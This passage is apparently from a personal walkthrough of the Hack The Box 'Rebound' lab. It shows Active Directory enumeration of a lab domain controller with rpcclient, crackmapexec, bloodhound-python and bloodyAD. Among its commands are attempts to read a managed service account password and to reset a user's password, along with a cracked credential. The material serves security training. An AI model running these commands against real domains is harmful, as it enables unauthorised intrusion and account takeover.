+SMB         10.129.189.166  445    DC01             7685: rebound\batch_runner (SidTypeUser)
+SMB         10.129.189.166  445    DC01             7686: rebound\tbrady (SidTypeUser)
+SMB         10.129.189.166  445    DC01             7687: rebound\delegator$ (SidTypeUser)</code></pre><p id="e818c347-1760-4525-8f7e-d163a9259e9e" class="">
+</p><p id="b64f7910-74a7-4563-9330-c9d6c748be2d" class="">
+</p><p id="deb13835-ca3a-425c-82b9-0f3767da9bdc" class="">enumdomusers with rpcclient </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7f45820c-3a46-40b4-b86e-8eab5e494dc3" class="code"><code class="language-PowerShell">rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[ppaul] rid:[0x79f]
+user:[llune] rid:[0xb88]
+user:[fflock] rid:[0xd36]
+user:[jjones] rid:[0x149d]
+user:[mmalone] rid:[0x15c1]
+user:[nnoon] rid:[0x1630]
+user:[ldap_monitor] rid:[0x1e01]
+user:[oorend] rid:[0x1e02]
+user:[winrm_svc] rid:[0x1e04]
+user:[batch_runner] rid:[0x1e05]
+user:[tbrady] rid:[0x1e06]</code></pre><p id="4f0e9c26-aef6-4ad5-acd2-72527baa3276" class="">
+</p><p id="82c25ea0-c5e3-4ea4-a844-2f0c2b940dfb" class="">Groups:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a37803ed-5d13-43d4-a4be-1f1ea069c93a" class="code"><code class="language-PowerShell">rpcclient $&gt; enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[ServiceMgmt] rid:[0x1e03]</code></pre><p id="710e56bf-4ad5-41b3-a5d4-8abc290e7b8c" class="">
+</p><p id="0c203080-420e-4a70-8733-c6b8184e1971" class="">Dumped all the users with cme</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="47179811-b179-4582-8e22-8e1d0d194a70" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-95cncm9bmq]─[~]
+└──╼ [★]$ cme smb 10.129.189.166 -u &#x27;oorend&#x27; -p password.txt --users
+SMB         10.129.189.166  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
+SMB         10.129.189.166  445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
+SMB         10.129.189.166  445    DC01             [-] Error enumerating domain users using dc ip 10.129.189.166: LDAPInvalidCredentialsResult - 49 - invalidCredentials - None - 80090346: LdapErr: DSID-0C090726, comment: AcceptSecurityContext error, data 80090346, v4563 - bindResponse - None
+SMB         10.129.189.166  445    DC01             [*] Trying with SAMRPC protocol
+SMB         10.129.189.166  445    DC01             [+] Enumerated domain user(s)
+SMB         10.129.189.166  445    DC01             rebound.htb\Administrator                  Built-in account for administering the computer/domain
+SMB         10.129.189.166  445    DC01             rebound.htb\Guest                          Built-in account for guest access to the computer/domain
+SMB         10.129.189.166  445    DC01             rebound.htb\krbtgt                         Key Distribution Center Service Account
+SMB         10.129.189.166  445    DC01             rebound.htb\ppaul                          
+SMB         10.129.189.166  445    DC01             rebound.htb\llune                          
+SMB         10.129.189.166  445    DC01             rebound.htb\fflock                         
+SMB         10.129.189.166  445    DC01             rebound.htb\jjones                         
+SMB         10.129.189.166  445    DC01             rebound.htb\mmalone                        
+SMB         10.129.189.166  445    DC01             rebound.htb\nnoon                          
+SMB         10.129.189.166  445    DC01             rebound.htb\ldap_monitor                   
+SMB         10.129.189.166  445    DC01             rebound.htb\oorend                         
+SMB         10.129.189.166  445    DC01             rebound.htb\winrm_svc                      
+SMB         10.129.189.166  445    DC01             rebound.htb\batch_runner                   
+SMB         10.129.189.166  445    DC01             rebound.htb\tbrady</code></pre><p id="1c34f286-cd27-4693-b430-7aedae3c6354" class="">
+</p><p id="5f83984d-ef2c-4fcf-bfec-e3ba910fa1ec" class="">Firing up bloodhound</p><p id="682b118d-57ed-4b7c-a343-687388bfe33f" class=""><code>bloodhound-python -u ldap_monitor -p &#x27;1GR8t@$$4u&#x27; -d rebound.htb -c all -dc DC01.rebound.htb -ns 10.129.77.1 --zip</code></p><p id="5cf240ed-d33e-4bbb-8414-909e769e75dd" class="">
+</p><p id="82d27e83-37bd-4c90-84ca-0b8169e9a091" class="">
+</p><p id="2f8ea956-b2d5-4f7f-8df2-84f6cddae776" class="">Trying bloodyAD to get the password of the delegator computer</p><p id="7e1b7093-471d-4c52-8257-f62a70849ab8" class=""><code>bloodyAD -u ldap_monitor -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.189.166 get children &#x27;DC=rebound,DC=htb&#x27; --type computer<br/><br/></code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="08e50211-42fe-46a5-866b-c5c10af13b35" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-95cncm9bmq]─[~]
+└──╼ [★]$ bloodyAD -u ldap_monitor -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.189.166 get children &#x27;DC=rebound,DC=htb&#x27; --type computer
+
+distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
+
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=rebound,DC=htb</code></pre><p id="4ec0db67-5b0c-40b4-8723-72e7ea1bf8b4" class="">
+</p><p id="c77990de-919e-407e-81a2-c76941b67b88" class="">Trying to read the password but no success</p><p id="2f1a4559-9fc0-40c5-bb5f-0cbaec1809e4" class=""><code>bloodyAD -u ldap_monitor -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.189.166 get object &#x27;delegator$&#x27; --attr msDS-ManagedPassword</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="07774d16-afba-4149-bc1d-dc422bc50be4" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-95cncm9bmq]─[~]
+└──╼ [★]$ bloodyAD -u ldap_monitor -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.189.166 get object &#x27;delegator$&#x27; --attr msDS-ManagedPassword
+
+distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</code></pre><p id="25ab3678-eac8-4cc3-ad71-d167734345de" class="">
+</p><p id="79248362-5a5d-4564-8efe-7d5fe718182f" class="">Using further to get some information from group members</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f533a5f3-231f-45cf-b925-3ed3b709b3c8" class="code"><code class="language-PowerShell">bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.189.166 get object ServiceMgmt --attr member
+
+distinguishedName: CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
+member: CN=fflock,CN=Users,DC=rebound,DC=htb; CN=ppaul,CN=Users,DC=rebound,DC=htbb</code></pre><p id="2fcc3ee6-17b3-46a3-a683-332322884d35" class="">
+</p><p id="b498099b-faa9-433c-af22-2163145923fb" class="">we get that fflock and ppaul is member of ServiceMgmt</p><p id="5f20d3c7-6bd0-44ef-8dea-331042bbfa42" class="">
+</p><p id="2995ed7e-5a53-4a0c-9a2a-059036685836" class="">Trying to change the password did not work as we don’t have enough permissions..</p><p id="e2f7e5bd-d3a7-4cb4-a53c-9ee0a3b89907" class=""><code>bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.189.166 set password &#x27;fflock&#x27; &#x27;Password123’</code></p><p id="be5fccd4-23dc-4364-84c8-498a9833218d" class="">
+</p><p id="0132b0e9-d614-4636-9148-eee9144130e1" class="">Interesting command to enumerate</p><p id="1700abfd-2563-405c-b963-6863f77e8618" class=""><code>bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object &#x27;DC01$&#x27; --resolve-sd</code></p><p id="672eed8a-7f04-4476-ac35-834c2f4f5986" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29211577-907f-47b2-b628-066c9490eb47" class="code"><code class="language-PowerShell">distinguishedName: CN=DC01,OU=Domain Controllers,DC=rebound,DC=htb
+accountExpires: 9999-12-31 23:59:59.999999+00:00
+badPasswordTime: 2023-09-12 03:14:09.045721+00:00
+cn: DC01
+dNSHostName: dc01.rebound.htb
+dSCorePropagationData: 2023-04-07 14:01:59+00:00; 1601-01-01 00:00:01+00:00
+displayName: DC01$
+instanceType: 4
+isCriticalSystemObject: True
+lastLogoff: 1601-01-01 00:00:00+00:00
+lastLogon: 2023-09-12 05:48:41.446121+00:00
+lastLogonTimestamp: 2023-09-04 17:21:42.969173+00:00
+logonCount: 261
+memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=rebound,DC=htb; CN=Cert Publishers,CN=Users,DC=rebound,DC=htb
+msDFSR-ComputerReferenceBL: CN=WIN-U8D2AHK6S0T,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=rebound,DC=htb
+msDS-GenerationId: GlHEQCnEfkg=
+msDS-SupportedEncryptionTypes: 28
+nTSecurityDescriptor.Owner: Domain Admins
+nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
+nTSecurityDescriptor.ACL.0.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.0.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.0.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.0.ObjectType: Display-Name; SAM-Account-Name; Description; Logon-Information
+nTSecurityDescriptor.ACL.0.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.1.Trustee: PRINCIPAL_SELF; Domain Admins
+nTSecurityDescriptor.ACL.1.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.1.ObjectType: DNS-Host-Name; Service-Principal-Name
+nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.2.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.2.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.2.ObjectType: Account-Restrictions
+nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.3.Trustee: Cert Publishers
+nTSecurityDescriptor.ACL.3.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.3.ObjectType: X509-Cert
+nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.4.Trustee: PRINTER_OPERATORS
+nTSecurityDescriptor.ACL.4.Right: DELETE_CHILD|CREATE_CHILD
+nTSecurityDescriptor.ACL.4.ObjectType: Print-Queue
+nTSecurityDescriptor.ACL.5.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.5.Trustee: WINDOWS_AUTHORIZATION_ACCESS_GROUP
+nTSecurityDescriptor.ACL.5.Right: READ_PROP
+nTSecurityDescriptor.ACL.5.ObjectType: Token-Groups-Global-And-Universal
+nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.6.Trustee: EVERYONE
+nTSecurityDescriptor.ACL.6.Right: CONTROL_ACCESS
+nTSecurityDescriptor.ACL.6.ObjectType: User-Change-Password
+nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.7.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.7.ObjectType: Personal-Information
+nTSecurityDescriptor.ACL.8.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.8.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.8.Right: GENERIC_READ|DELETE|CONTROL_ACCESS|DELETE_TREE
+nTSecurityDescriptor.ACL.8.ObjectType: Self
+nTSecurityDescriptor.ACL.9.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.9.Trustee: LOCAL_SYSTEM; Domain Admins
+nTSecurityDescriptor.ACL.9.Right: GENERIC_ALL
+nTSecurityDescriptor.ACL.9.ObjectType: Self
+nTSecurityDescriptor.ACL.10.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.10.Right: DELETE_CHILD|CREATE_CHILD
+nTSecurityDescriptor.ACL.10.ObjectType: Self
+nTSecurityDescriptor.ACL.11.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.11.Trustee: AUTHENTICATED_USERS
+nTSecurityDescriptor.ACL.11.Right: GENERIC_READ
+nTSecurityDescriptor.ACL.11.ObjectType: Self
+nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.12.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.12.Right: READ_PROP
+nTSecurityDescriptor.ACL.12.ObjectType: General-Information; Account-Restrictions; Logon-Information; Remote-Access-Information; Group-Membership
+nTSecurityDescriptor.ACL.12.InheritedObjectType: inetOrgPerson; User
+nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.13.Trustee: Enterprise Key Admins; Key Admins
+nTSecurityDescriptor.ACL.13.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.13.ObjectType: ms-DS-Key-Credential-Link
+nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.14.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.14.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.14.ObjectType: DS-Validated-Write-Computer
+nTSecurityDescriptor.ACL.14.Flags: INHERITED
+nTSecurityDescriptor.ACL.15.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.15.Trustee: CREATOR_OWNER
+nTSecurityDescriptor.ACL.15.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.15.ObjectType: DS-Validated-Write-Computer
+nTSecurityDescriptor.ACL.15.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.16.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.16.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.16.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.16.ObjectType: DS-Validated-Write-Computer
+nTSecurityDescriptor.ACL.16.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.17.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.17.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
+nTSecurityDescriptor.ACL.17.Right: READ_PROP
+nTSecurityDescriptor.ACL.17.ObjectType: Token-Groups
+nTSecurityDescriptor.ACL.17.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.18.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.18.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
+nTSecurityDescriptor.ACL.18.Right: READ_PROP
+nTSecurityDescriptor.ACL.18.ObjectType: Token-Groups
+nTSecurityDescriptor.ACL.18.InheritedObjectType: User; Group
+nTSecurityDescriptor.ACL.18.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.19.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.19.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.19.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.19.ObjectType: ms-TPM-Tpm-Information-For-Computer
+nTSecurityDescriptor.ACL.19.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.19.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.20.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.20.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.20.Right: GENERIC_READ
+nTSecurityDescriptor.ACL.20.ObjectType: Self
+nTSecurityDescriptor.ACL.20.InheritedObjectType: inetOrgPerson; Group; User
+nTSecurityDescriptor.ACL.20.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.21.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.21.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.21.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.21.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
+nTSecurityDescriptor.ACL.21.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
+nTSecurityDescriptor.ACL.22.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.22.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.22.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.22.ObjectType: Private-Information
+nTSecurityDescriptor.ACL.22.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.23.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.23.Trustee: Enterprise Admins
+nTSecurityDescriptor.ACL.23.Right: GENERIC_ALL
+nTSecurityDescriptor.ACL.23.ObjectType: Self
+nTSecurityDescriptor.ACL.23.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.24.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.24.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.24.Right: LIST_CHILD
+nTSecurityDescriptor.ACL.24.ObjectType: Self
+nTSecurityDescriptor.ACL.24.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.25.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.25.Trustee: BUILTIN_ADMINISTRATORS
+nTSecurityDescriptor.ACL.25.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
+nTSecurityDescriptor.ACL.25.ObjectType: Self
+nTSecurityDescriptor.ACL.25.Flags: CONTAINER_INHERIT; INHERITED
+name: DC01
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=rebound,DC=htb
+objectClass: top; person; organizationalPerson; user; computer
+objectGUID: {dbdfe86f-7a6e-42c6-af7d-04373392a3d2}
+objectSid: S-1-5-21-4078382237-1492182817-2568127209-1000
+operatingSystem: Windows Server 2019 Standard
+operatingSystemVersion: 10.0 (17763)
+primaryGroupID: 516
+pwdLastSet: 2023-08-22 19:04:07.656416+00:00
+rIDSetReferences: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=rebound,DC=htb
+sAMAccountName: DC01$
+sAMAccountType: 805306369
+serverReferenceBL: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=rebound,DC=htb
+servicePrincipalName: ldap/dc01.rebound.htb/ForestDnsZones.rebound.htb; ldap/dc01.rebound.htb/DomainDnsZones.rebound.htb; Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.rebound.htb; DNS/dc01.rebound.htb; GC/dc01.rebound.htb/rebound.htb; HOST/dc01.rebound.htb/rebound; HOST/dc01.rebound.htb/rebound.htb; ldap/dc01.rebound.htb/rebound; ldap/dc01.rebound.htb; ldap/dc01.rebound.htb/rebound.htb; RestrictedKrbHost/dc01.rebound.htb; HOST/dc01.rebound.htb; RestrictedKrbHost/DC01; HOST/DC01/rebound; HOST/DC01; ldap/DC01/rebound; ldap/DC01; RPC/1b88a206-6597-46cd-b042-25101349355f._msdcs.rebound.htb; E3514235-4B06-11D1-AB04-00C04FC2DCD2/1b88a206-6597-46cd-b042-25101349355f/rebound.htb; ldap/1b88a206-6597-46cd-b042-25101349355f._msdcs.rebound.htb
+uSNChanged: 163887
+uSNCreated: 12293
+userAccountControl: SERVER_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION
+userCertificate: MIIGNDCCBRygAwIBAgITbwAAAAPtwvSd343f6gAAAAAAAzANBgkqhkiG9w0BAQsFADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHcmVib3VuZDEYMBYGA1UEAxMPcmVib3VuZC1EQzAxLUNBMB4XDTIzMDgyNTIyNDgwOVoXDTI0MDgyNDIyNDgwOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKhVKTQAiNGS4vumMolhB8bJZ4mlVUOty9jWsatponX+TDBF9cpZdF9QUE/LncYGQ/WATWpcAfoOYBUJE8KRThXftjY7mBVlIpVtH6CWUDZUfxtlxpG0zwiOb3Ol9zMnZe8Ge7TsWpvWN66sCuagniOBqT4JJDT0NUec1H/zN7W+cvL1tn7BKjRU6TcR5s0LloQafd6X0Fyjks44cyBHJ8XONDVq5gyOPqtKhel3Sc4Om2BsnGRHIBoJNphHX2A2RUJTwCR4GXVRH4P51z6C7WStXc6hMBf8D+2KSmuTf3yvouvnIz9/xazgONGLSsHiLDsUj/WTSuAU93r6S3qJZykCAwEAAaOCA10wggNZMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQBgjcVCIe1tX2/jH2CuYk0hp/UUoHi5h51AR0CAXMCAQAwFAYDVR0lBA0wCwYJKwYBBAGCNxUTMA4GA1UdDwEB/wQEAwIFoDAcBgkrBgEEAYI3FQoEDzANMAsGCSsGAQQBgjcVEzB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBTIi5wjVY+E3iTUTapIrgbJqNkrNzAfBgNVHSMEGDAWgBSbmFtA5+grnO0zFpUkAsloqtvtTTCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGzbGRhcDovLy9DTj1yZWJvdW5kLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZWJvdW5kLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEBBIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049cmVib3VuZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXJlYm91bmQsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD8GA1UdEQEB/wQ1MDOgHwYJKwYBBAGCNxkBoBIEEG/o39tuesZCr30ENzOSo9KCEGRjMDEucmVib3VuZC5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAEKDeLl0jh1E0lbF7aiKIHH7NhBDjX5DHWG86u5zISkWuXm/keDhJcw6qVNwp8xaideXLY+w8AfhByM0Fp9oQDgSe0Oa9WPQ++b4UFcJv+MC7aYDEBwxFw0tzR3rhOa80+iU07HDqAM5c6IJcSdHR9an94XsvSfJFVKRl2TeiMrs6i+q85075Ap3DSg6HbX8E9vdyKftbzxYL9+gO5VFumRjP0CkUMU44byZXYbwoWfdbONZA0q1vfP+lnaa5LnM2X2jAckewQ05f16COedfo0TXqrKRo5PkhIU9yzRDvzQVM3O8o/1l81CuMpvWgjJP7XGgpjhgLGEOoXci9J9mbLo=; 